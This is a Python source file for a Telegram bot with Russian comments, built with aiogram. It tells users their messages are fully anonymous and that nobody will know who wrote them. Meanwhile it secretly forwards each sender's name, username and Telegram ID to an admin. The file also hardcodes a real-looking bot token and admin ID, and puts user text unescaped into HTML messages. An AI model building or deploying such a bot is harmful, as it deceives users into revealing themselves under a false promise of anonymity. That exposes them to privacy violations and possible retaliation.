"""
Анонимный Telegram бот
- Пользователи пишут анонимно
- Админ видит кто именно написал (имя, username, ID)
- Пользователь получает подтверждение об отправке
"""

import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import Message

# ─── НАСТРОЙКИ ───────────────────────────────────────────────────────────────

BOT_TOKEN = "8903105762:AAFRB2D8E9AMksv-qER66l_RMUAijxzEM84"   # Получить у @BotFather
ADMIN_ID   = 6580598992          # Ваш Telegram ID (узнать у @userinfobot)

# ─────────────────────────────────────────────────────────────────────────────

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher()


# ── /start ────────────────────────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "👤 <b>Анонимный бот</b>\n\n"
        "Напиши любое сообщение — оно будет отправлено анонимно.\n"
        "Твоё имя <b>не будет показано</b> получателям.\n\n"
        "✉️ Просто напиши что хочешь отправить:",
        parse_mode="HTML"
    )


# ── Приём сообщений от пользователей ─────────────────────────────────────────
@dp.message(F.text & ~F.text.startswith("/"))
async def handle_message(message: Message):
    user = message.from_user

    # Формируем инфо о пользователе для АДМИНА
    username_str = f"@{user.username}" if user.username else "нет username"
    full_name    = user.full_name or "Без имени"

    admin_text = (
        f"📨 <b>Новое анонимное сообщение</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Имя:</b> {full_name}\n"
        f"🔗 <b>Username:</b> {username_str}\n"
        f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💬 <b>Сообщение:</b>\n{message.text}"
    )

    # Отправляем админу с полной инфой
    try:
        await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка отправки админу: {e}")

    # Пользователю — просто подтверждение (без раскрытия)
    await message.answer(
        "✅ <b>Сообщение отправлено анонимно!</b>\n"
        "Никто не узнает, что это написал ты.",
        parse_mode="HTML"
    )


# ── /reply — ответить пользователю (только для админа) ───────────────────────
@dp.message(Command("reply"))
async def cmd_reply(message: Message):
    """Использование: /reply 123456789 Текст ответа"""
    if message.from_user.id != ADMIN_ID:
        return  # Игнорируем не-админов

    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer(
            "⚠️ Использование: <code>/reply USER_ID текст</code>\n"
            "Пример: <code>/reply 123456789 Привет!</code>",
            parse_mode="HTML"
        )
        return

    try:
        user_id     = int(parts[1])
        reply_text  = parts[2]
        await bot.send_message(
            user_id,
            f"📩 <b>Ответ от администратора:</b>\n\n{reply_text}",
            parse_mode="HTML"
        )
        await message.answer(f"✅ Ответ отправлен пользователю <code>{user_id}</code>", parse_mode="HTML")
    except ValueError:
        await message.answer("❌ Неверный ID пользователя.")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")


# ── /ban — заблокировать пользователя (только для админа) ────────────────────
@dp.message(Command("ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer(
        "ℹ️ Для бана — просто заблокируй пользователя через список чатов,\n"
        "или добавь логику с БД (см. комментарий в коде)."
    )


# ── Запуск ────────────────────────────────────────────────────────────────────
async def main():
    print("🤖 Бот запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
